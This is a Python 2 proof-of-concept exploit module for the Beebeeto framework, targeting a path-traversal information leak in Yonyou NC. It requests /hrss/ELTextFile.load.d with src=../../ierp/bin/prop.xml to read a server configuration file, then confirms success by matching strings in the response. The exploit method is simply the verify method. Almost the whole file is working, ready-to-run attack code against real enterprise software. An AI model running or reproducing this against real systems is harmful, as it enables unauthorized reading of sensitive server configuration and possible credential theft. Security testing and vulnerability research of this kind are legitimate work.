#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0008',
            'name': '用友NC /hrss/ELTextFile.load.d 信息泄漏漏洞 POC',
            'author': '1024',
            'create_date': '2015-01-14',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': '用有',
            'vul_version': ['NC'],
            'type': 'Information Disclosure',
            'tag': ['用友漏洞', 'Yonyou信息泄漏漏洞', '/hrss/ELTextFile.load.d'],
            'desc': '../../ierp/bin/prop.xml',
            'references': ['http://wooyun.org/bugs/wooyun-2014-066512',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = '%s/hrss/ELTextFile.load.d?src=../../ierp/bin/prop.xml' % args['options']['target']
        req = urllib2.Request(verify_url)
        content = urllib2.urlopen(req).read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        if 'enableHotDeploy' in content and 'internalServiceArray' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())